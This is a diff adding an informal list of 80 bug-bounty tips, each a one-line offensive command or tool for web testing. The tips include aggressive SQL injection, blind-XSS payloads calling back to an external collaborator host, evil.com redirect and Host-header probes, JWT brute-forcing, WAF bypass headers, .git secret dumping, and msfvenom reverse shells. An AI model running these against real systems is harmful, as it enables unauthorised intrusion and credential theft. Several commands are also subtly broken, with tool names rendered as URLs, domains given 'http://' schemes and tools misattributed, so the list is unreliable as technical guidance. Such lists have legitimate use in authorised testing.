@@ -1,0 +1,82 @@
+80 Bug bounty tips for my lovely dovely fam <3 
+
+1️⃣ Use sqlmap --risk=3 --level=5 for aggressive SQLi testing.
+2️⃣ Automate XSS hunting with Dalfox -b http://yourxsscollab.com -u http://target.com 🚀
+3️⃣ Check for subdomain takeovers with subzy --targets subdomains.txt
+4️⃣ Use amass enum -passive -d http://target.com for deep subdomain recon 🌎
+5️⃣ Bypass WAFs with ffuf -w payloads.txt -u https://target.com/FUZZ -H "X-Originating-IP: 127.0.0.1"
+6️⃣ Automate JWT cracking with jwt_tool -C -t token.jwt --wordlist rockyou.txt 🔑
+7️⃣ Scan GraphQL endpoints with GraphQLmap -u https://target.com/graphql 🛠
+8️⃣ Bruteforce hidden directories with dirsearch -u https://target.com -e php,html,js
+9️⃣ Find misconfigured S3 buckets with aws s3 ls s3://bucket-name/ --no-sign-request ☁
+🔟 Bypass SSRF restrictions by resolving DNS using Burp Collaborator
+1️⃣1️⃣ Check for open redirects with qsreplace 'https://evil.com' | httpx -silent 🔄
+1️⃣2️⃣ Use subfinder -d http://target.com | httpx -silent to filter live subdomains 🏠
+1️⃣3️⃣ Hunt for leaked API keys with truffleHog --regex --entropy=True 🔑
+1️⃣4️⃣ Automate CORS misconfig detection with Corsy -u https://target.com
+1️⃣5️⃣ Enumerate subdomains via http://crt.sh with curl "https://crt.sh/?q=%.target.com&output=json"
+1️⃣6️⃣ Scan for open ports with nmap -p- -T4 -A http://target.com 🔍
+1️⃣7️⃣ Find webhooks & exposed APIs with gf webhook | httpx -silent
+1️⃣8️⃣ Automate CSRF token stealing with Burp Suite Autorize Plugin
+1️⃣9️⃣ Extract secrets from .git with git-dumper https://target.com/.git /output-dir 🕵️‍♂️
+2️⃣0️⃣ Scan for JWT weak secrets with jwtcrack -t token.jwt -w rockyou.txt
+2️⃣1️⃣ Fuzz POST parameters with ffuf -X POST -d "param=FUZZ" -w payloads.txt -u http://target.com
+2️⃣2️⃣ Automate broken authentication checks with nuclei -t cves/ -l targets.txt 🔓
+2️⃣3️⃣ Automate IDOR checks with ParamSpider -d http://target.com 🕸
+2️⃣4️⃣ Search for AWS credentials with ripgrep -e "AKIA[A-Z0-9]{16}"
+2️⃣5️⃣ Bypass CSP with JSONP endpoints using jsonp-hunter -u http://target.com
+2️⃣6️⃣ Check for template injection with tplmap -u https://target.com -p param 🛠
+2️⃣7️⃣ Hunt for subdomain takeovers using subjack -w subdomains.txt -t 50 -o results.txt
+2️⃣8️⃣ Automate WebSocket testing with wssip -u wss://target.com 🔌
+2️⃣9️⃣ Scan for vulnerable third-party libraries with Retire.js 🔥
+3️⃣0️⃣ Extract exposed API keys from JavaScript with linkfinder -i target.js
+3️⃣1️⃣ Test for Host header attacks using curl -H "Host: http://evil.com" https://target.com
+3️⃣2️⃣ Extract parameters from JS files using ParamSpider -d http://target.com
+3️⃣3️⃣ Use xsstrike -u https://target.com for automated XSS scanning 🛡
+3️⃣4️⃣ Automate GraphQL security scanning with InQL Scanner
+3️⃣5️⃣ Automate API token brute-force with patator http_fuzz
+3️⃣6️⃣ Scan for misconfigured Firebase databases with http://firebaseScanner.py http://target.com 🔥
+3️⃣7️⃣ Use dnsx -l subdomains.txt -silent -a to resolve A records of subdomains
+3️⃣8️⃣ Scan for HTTP smuggling vulnerabilities with http://smuggler.py -u https://target.com
+3️⃣9️⃣ Bruteforce JWT signing keys with crackjwt --token token.jwt --wordlist rockyou.txt 🔑
+4️⃣0️⃣ Use hakrawler -url https://target.com -depth 2 -plain to extract URLs
+4️⃣1️⃣ Fuzz REST API endpoints with ffuf -u https://target.com/api/FUZZ -w wordlist.txt
+4️⃣2️⃣ Test for blind XSS using http://xsshunter.com payloads
+4️⃣3️⃣ Hunt for forgotten test endpoints with waybackurls http://target.com | gf test-endpoints
+4️⃣4️⃣ Scan for HTTP/2 desync vulnerabilities with request-smuggler
+4️⃣5️⃣ Find outdated WordPress plugins using wpscan --url https://target.com
+4️⃣6️⃣ Automate reverse shell generation using msfvenom 🎯
+4️⃣7️⃣ Discover parameter pollution vulnerabilities with arjun -u https://target.com
+4️⃣8️⃣ Find misconfigured Open Redirects using OpenRedireX
+4️⃣9️⃣ Scan for CSP weaknesses using csp-evaluator 🛡
+5️⃣0️⃣ Find duplicate passwords in response bodies with gf passwords
+5️⃣1️⃣ Bruteforce directories using feroxbuster -u https://target.com -e -t 50
+5️⃣2️⃣ Identify API vulnerabilities using nuclei -t nuclei-templates/api
+5️⃣3️⃣ Scan for outdated dependencies with OWASP Dependency-Check
+5️⃣4️⃣ Find JavaScript vulnerabilities with jsleak -u https://target.com
+5️⃣5️⃣ Automate hidden parameter detection using Parameth
+5️⃣6️⃣ Scan for FTP misconfigurations using nmap -p 21 --script=ftp-anon http://target.com
+5️⃣7️⃣ Enumerate usernames on WordPress with wpscan --enumerate u -u https://target.com
+5️⃣8️⃣ Automate XSS payload injection using XSStrike
+5️⃣9️⃣ Detect leaked credentials in repositories using GitLeaks
+6️⃣0️⃣ Scan for SSRF using Burp Suite Collaborator
+6️⃣1️⃣ Enumerate login endpoints using waybackurls & gau
+6️⃣2️⃣ Automate JWT attacks with jwt-pwn
+6️⃣3️⃣ Hunt for forgotten admin panels with Gobuster dir -u https://target.com -w wordlist.txt
+6️⃣4️⃣ Scan for WordPress misconfigurations with WPScan
+6️⃣5️⃣ Automate GraphQL endpoint fuzzing with GraphQLmap
+6️⃣6️⃣ Use dnsrecon -d http://target.com -t axfr to check for DNS zone transfers
+6️⃣7️⃣ Find API token leaks in JavaScript using SecretFinder
+6️⃣8️⃣ Bypass robots.txt restrictions with wget --mirror --no-robots
+6️⃣9️⃣ Test for LFI vulnerabilities using dotdotpwn
+7️⃣0️⃣ Scan for API misconfigurations using Swagger Scanner
+7️⃣1️⃣ Automate CSRF attack simulation using XSRFProbe
+7️⃣2️⃣ Find hardcoded credentials using truffleHog
+7️⃣3️⃣ Automate response time-based attacks using timing-attack
+7️⃣4️⃣ Fuzz HTTP methods using metasploit auxiliary/scanner/http/http_methods
+7️⃣5️⃣ Automate cookie poisoning attacks using Cookiemonster
+7️⃣6️⃣ Extract sensitive data from memory dumps using volatility
+7️⃣7️⃣ Bypass authentication using Burp Suite NoSQLMap
+7️⃣8️⃣ Automate vulnerability detection with ProjectDiscovery Nuclei
+7️⃣9️⃣ Scan for JavaScript key leaks using JSParser
+8️⃣0️⃣ Hunt for vulnerable headers using Security Headers Scanner
